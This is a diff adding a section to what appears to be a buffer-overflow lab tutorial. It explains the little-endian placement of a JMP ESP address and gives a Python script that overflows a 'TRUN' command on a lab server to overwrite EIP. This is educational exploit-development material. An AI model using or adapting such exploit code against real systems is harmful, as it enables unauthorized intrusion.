@@ -419,7 +419,32 @@ We can verify this in Immunity by finding this memory location and looking at th
 + Right-click in the top left panel, select `Search for`, select `Command`, input `jmp esp`, and press enter. 
 
 We are greeted with the following
+
 ![](/assets/images/CTP/proof.JPG)
+
+So we are sure that Mona wasn't telling us lies. Since Windows is [little-endian](https://en.wikipedia.org/wiki/Endianness), we can place this address into the `EIP` overwrite portion of our payload in reverse order so that `0x625011bb` becomes `\xbb\x11\x50\x62` in our payload, which now looks like this: 
+```python
+#!/usr/bin/python
+
+import socket
+import os
+import sys
+
+host = "192.168.1.201"
+port = 9999
+
+buffer = "A" * 2002
+buffer += "\xbb\x11\x50\x62"			#This is for our JMP ESP address in reverse order (little-endian)
+buffer += "C" * (5000 - len(buffer))
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host,port))
+print s.recv(1024)
+s.send("TRUN /.:/ " + buffer)
+print s.recv(1024)
+s.close()
+```
+
 
 
 
